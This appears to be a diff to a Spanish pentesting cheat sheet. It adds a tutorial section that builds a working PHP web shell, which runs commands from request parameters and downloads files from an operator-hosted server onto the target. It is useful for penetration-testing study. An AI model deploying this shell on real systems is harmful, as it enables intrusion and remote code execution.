@@ -29,14 +29,9 @@
        * [Shellshock](#shellshock)
        * [Padding Oracle Attack](#padding-oracle-attack)   
        * [WordPress](#wordpress)
-       * [File Upload Bypass](#file-upload-bypass)
-       * [Fuerza Bruta en Formularios](#fuerza-bruta-en-formularios)
-       * [Enumeración de Usuarios en Paneles de Autenticación](#login-user-enumeration)
-       * [PHP Reverse Shell](#php-reverse-shell)
        * [PHP Reverse Shell Manual Multifuncional](#php-reverse-shell-manual-multifuncional)       
        * [ASP/ASPX Reverse Shell](#asp-aspx-reverse-shell)
-       * [NoTCPShell](#notcpshell)
-       * [Burpsuite](#burpsuite)     
+       * [NoTCPShell](#notcpshell) 
      * [Pentesting Linux](#pentesting-linux)
         * [Tratamiento de la TTY](#tratamiento-de-la-tty)
         * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
@@ -1142,9 +1137,67 @@ Para apuntar a dicho script tenemos 3 vías:
 * http://192.168.1.x/recursoinexistente (Para causar un error que haga que se cargue el script 404.php)
 * http://192.168.1.x/404.php
 
-#### File Upload Bypass
+#### PHP Reverse Shell Manual Multifuncional
 
+La más típica de las ejecuciones vía PHP que nos podemos configurar es la siguiente:
 
+```php
+<?php
+	system('whoami');
+?>
+```
+
+Pero esto dice mucho de nosotros, vamos a mejorar un poco las cosas. En vez de usar **system**, podemos usar **shell_exec**, más específico para la ejecución de comandos vía shell con retorno del output en formato string.
+
+Esto se resume en la siguiente estructura:
+
+```php
+<?php
+	echo shell_exec('whoami');
+?>
+```
+
+En caso de querer ejecutar comandos personalizados desde la URL, podemos definir una estructura como la siguiente:
+
+```php
+<?php
+	echo shell_exec($_REQUEST['cmd']);
+?>
+```
+
+De manera que podríamos elaborar desde la URL la siguiente petición:
+
+`http://192.168.1.X/fichero.php?cmd=whoami`
+
+A la hora de ejecutar ciertos comandos como '_ps -faux_', o un simple '_cat /etc/passwd_', se puede ver como el Output mostrado vía web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar añadiendo unas etiquetas de preformateado en nuestro script:
+
+```php
+<?php
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+En caso de querer hacerlo **multifuncional**, podemos gestionar la variable proporcionada desde el usuario que hace la petición, donde para el caso presentado a continuación, además de ejecutar comandos a través de la variable '_fexec_', creamos una nueva variable '_fupload_' para la transferencia de archivos desde nuestra máquina local a la máquina remota en el directorio de trabajo:
+
+```php
+<?php
+	if(isset($_REQUEST['fexec'])){
+		echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
+	};
+	
+	if(isset($_REQUEST['fupload'])){
+		file_put_contents($_REQUEST['fupload'], file_get_contents("http://127.0.0.1:8000/" . $_REQUEST['fupload']));
+	};
+?>
+```
+
+De esta forma, el usuario que hace las consultas podría efectuar cualquiera de las siguientes 3 operaciones:
+
+* http://192.168.1.X/fichero.php?fexec=whoami
+* http://192.168.1.X/fichero.php?fupload=script.php 
+* http://192.168.1.X/fichero.php?upload=script.php&fexec=php+script.php
+
+Para depositar archivos sobre el sistema aprovechando la variable '_fupload_', necesitaremos compartir un servidor con Python perviamente sobre el directorio cuyos recursos queramos depositar sobre el equipo remoto.
 
 ### Pentesting Linux
 
